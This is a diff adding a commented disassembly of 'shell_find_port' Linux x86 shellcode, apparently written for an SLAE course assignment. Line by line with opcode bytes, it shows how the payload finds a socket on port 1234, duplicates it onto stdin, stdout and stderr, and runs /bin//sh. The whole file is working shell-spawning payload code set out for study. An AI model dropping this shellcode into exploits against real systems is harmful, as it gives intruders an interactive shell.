@@ -1,0 +1,37 @@
+# Dissection - shell-find-port, commented disassembly
+# Paw Petersen, SLAE-656
+# https://www.pawpetersen.dk/slae-assignment-5c-shellcode-dissection-shell_find_port-linux-x86/
+ 
+00  31DB          xor ebx,ebx                ; reset ebx
+02  53            push ebx                   ; push 0x0 (addr)
+03  89E7          mov edi,esp                ; edi = pointer to 0x0
+05  6A10          push byte +0x10            ; push 0x10 (addrlen)
+07  54            push esp                   ; push pointer to addrlen
+08  57            push edi                   ; push pointer to addr
+09  53            push ebx                   ; push 0x0 (sockfd)
+0A  89E1          mov ecx,esp                ; ecx = pointer to 0x0
+0C  B307          mov bl,0x7                 ; bl = 0x7 (getpeername)
+0E  FF01          inc dword [ecx]            ; increment counter value
+10  6A66          push byte +0x66            
+12  58            pop eax                    ; eax = socketcall
+13  CD80          int 0x80                   ; syscall
+15  66817F0204D2  cmp word [edi+0x2],0xd204  ; returned port 1234 ?
+1B  75F1          jnz 0xe                    ; try again
+1D  5B            pop ebx                    ; save sockfd back into ebx
+1E  6A02          push byte +0x2
+20  59            pop ecx                    ; ecx = 0x2 (stderr)
+21  B03F          mov al,0x3f                ; eax = dup2
+23  CD80          int 0x80                   ; syscall
+25  49            dec ecx                    ; decrement ecx (stdout,stdin)
+26  79F9          jns 0x21                   ; jump if not signed (>0)
+28  50            push eax                   ; push 0x0
+29  682F2F7368    push dword 0x68732f2f      ; hs//
+2E  682F62696E    push dword 0x6e69622f      ; nib/
+33  89E3          mov ebx,esp                ; ebx = pointer to /bin//sh
+35  50            push eax                   ; push 0x0
+36  53            push ebx                   ; push pointer to /bin//sh
+37  89E1          mov ecx,esp                ; ecx = pointer to pointer
+39  99            cdq                        ; reset edx
+3A  B00B          mov al,0xb                 ; execve
+3C  CD80          int 0x80                   ; syscall
+3E  0A            db 0x0a                    ; newline
